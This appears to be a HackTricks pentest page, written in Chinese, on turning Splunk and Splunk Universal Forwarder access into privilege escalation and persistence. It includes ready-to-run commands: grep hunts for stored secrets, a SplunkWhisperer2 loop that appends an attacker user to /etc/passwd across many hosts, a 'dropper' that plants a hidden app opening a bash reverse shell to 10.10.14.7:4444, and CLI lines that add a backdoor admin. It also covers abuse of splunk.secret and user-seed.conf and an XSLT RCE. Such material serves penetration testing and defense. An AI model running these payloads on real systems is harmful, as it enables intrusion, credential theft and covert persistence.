# Splunk LPE 和 Persistence

{{#include ../../banners/hacktricks-training.md}}

如果在对机器进行**内部**或**外部枚举**时发现正在运行 **Splunk**（web UI 通常使用 **8000**，management API 使用 **8089**），有效凭据通常可以通过 app installation、scripted inputs 或 management actions 转化为**代码执行**。如果 Splunk 以 **root** 身份运行，这通常会立即导致**权限提升**。

如果你只需要了解通用的远程攻击面、枚举或 app-upload RCE 路径，请查看：

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

如果你**已经是 root**，且 Splunk 服务不只是监听 localhost，那么还可以窃取 **Splunk password hashes**、恢复**加密 secrets**，或推送一个**恶意 app**，以便在本地或多个 forwarder 上维持 persistence。

## 有趣的本地文件

当你进入一台运行 Splunk 或 Splunk Universal Forwarder 的主机时，以下路径通常最值得关注：
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
重要 artifacts：

- **`$SPLUNK_HOME/etc/passwd`**：本地 Splunk users 和 password hashes。
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**：Splunk 用于加密存储在多个 `.conf` 文件中的 secrets 的 key。
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**：初始 admin bootstrap 文件；在 gold images 和 provisioning 错误中很有用。如果 `etc/passwd` 已存在，则会忽略该文件。
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**：通常启用 scripted inputs 的位置。
- **`$SPLUNK_HOME/etc/deployment-apps/`** 或 **`$SPLUNK_HOME/etc/apps/`**：适合隐藏 persistent app，或检查当前已分发的内容。

## Splunk Universal Forwarder Agent Exploit Summary

更多详情请查看 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)。以下仅为 summary：

**Exploit overview：**
针对 Splunk Universal Forwarder（UF）的 exploit 允许拥有 **agent password** 的 attackers 在运行该 agent 的系统上执行 arbitrary code，从而可能 compromize 环境中的大量主机。

**Why it works：**

- UF management service 通常暴露在 **TCP 8089**。
- Attackers 可以通过 API 进行 authenticate，并指示 forwarder 安装 **malicious app bundle**。
- 同一 primitive 可在本地用于 **LPE**，也可远程用于 **RCE**。
- 诸如 **SplunkWhisperer2** 之类的 public tooling 可以自动创建 app bundle，并为 Linux targets 调整 payloads。

**Common ways to recover the password：**

- documentation、scripts、shares 或 deployment automation 中的 cleartext credentials。
- `$SPLUNK_HOME/etc/passwd` 中的 password hashes，随后进行 offline cracking。
- gold images 或 provisioning leftovers，例如 `user-seed.conf`。

**Impact：**

- 在每个被 compromize 的 host 上获得 SYSTEM/root-level code execution。
- 部署 persistent apps、backdoors 或 ransomware。
- 在数据被 forward 之前禁用或篡改 telemetry。

**Example command for exploitation：**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**可用的公开 exploits：**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## 通过 Scripted Inputs 或 Malicious Apps 实现 Persistence

如果你以 `root`/`splunk` 身份拥有 **filesystem write access**，或拥有用于安装 apps 的 authenticated access，那么放置一个包含 **scripted input** 的 **custom app** 是一种非常可靠的 persistence 机制。Splunk 官方文档要求 scripted inputs 位于 app directory 下，并从 `inputs.conf` 中启用。

典型布局：
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
最简 `inputs.conf`：
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
快速 Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
注：

- 同样的 trick 也适用于 **Universal Forwarder**，使用 `/opt/splunkforwarder/etc/apps/`。
- Attackers 通常会通过修改合法的 add-on 来隐藏，而不是创建明显恶意的 app。
- 在 **deployment server** 上，将恶意 app 放入 `deployment-apps/` 会形成 **fleet-wide persistence**，因为 forwarders 会轮询、下载更新后的 app，并且通常会重启以应用这些更新。

## Credential Theft and Admin Takeover

如果你可以读取 Splunk 的本地文件，通常有两个较好的目标：恢复 **Splunk admin access** 和恢复 **encrypted service credentials**。

### Password hashes and local users

Splunk 将本地 authentication data 存储在 `etc/passwd` 中。根据部署方式，对该文件进行 cracking 可能会恢复可用于 web UI 和 management API 的有效 credentials。

如果你已经拥有有效的 **admin** credentials，并且 Splunk 使用其 **native** authentication backend，则 CLI 本身即可用于 persistence：
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` 和加密值

Splunk 使用 `etc/auth/splunk.secret` 保护存储在多个配置文件中的敏感值。如果你能同时窃取 **secret** 和相关的 **`.conf` files**，通常就可以恢复或重放：

- forwarder/indexer 共享 secret，例如 `pass4SymmKey`
- TLS private-key passwords，例如 `sslPassword`
- LDAP bind credentials，例如 `bindDNPassword`

即使 Splunk admin password 本身无法 crack，这对于 **lateral movement** 仍然很有用。

### `user-seed.conf` abuse

`user-seed.conf` 只会在首次启动时使用，或者在 `etc/passwd` 不存在时使用。因此，它在 live box 上的实用性较低，但在以下场景中非常值得关注：

- compromised installation templates
- container images
- unattended provisioning workflows
- Splunk 会被自动重新初始化的 appliances

在这些情况下，植入使用 `splunk hash-passwd` 生成的 `HASHED_PASSWORD`，可以让你在 redeployment 后以一种隐蔽的方式重新获得 admin access。

## Abusing Splunk Queries

如需更多详情，请查看 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)。

一种近期实用的 technique 是利用存在漏洞的 Splunk Enterprise 版本中的 **user-supplied XSLT**，将一个低权限的 authenticated account 转变为以 **`splunk` user** 身份执行 **OS command execution**。

High-level flow：

1. Authenticate to Splunk。
2. 通过 preview/upload functionality 上传恶意的 **XSL** file。
3. 让 Splunk 使用从 **dispatch** directory 加载的上传 stylesheet 渲染 search results。
4. 利用 XSLT payload 写入 file，或通过 Splunk 的 search pipeline 触发 execution（例如访问 `runshellscript` 等 internal functionality）。

重要的 offensive takeaway 是，这条路径可以实现 **post-auth RCE without needing app upload**。在 Linux 上，它通常会让你进入 **`splunk`** account。这个 account 仍然很有价值，因为该 user 通常拥有 application tree 的所有权，可以读取 secrets，并且能够植入即使 shell 丢失也能继续存在的 persistent apps。

Exploitation 过程中使用的一条 representative path 是：
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
如果 Splunk 以过多权限运行，或者 `splunk` 用户可以访问危险 scripts、可写的 service units 或不当的 `sudo` 规则，这就会形成一条清晰的 **LPE** chain。

## 参考

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
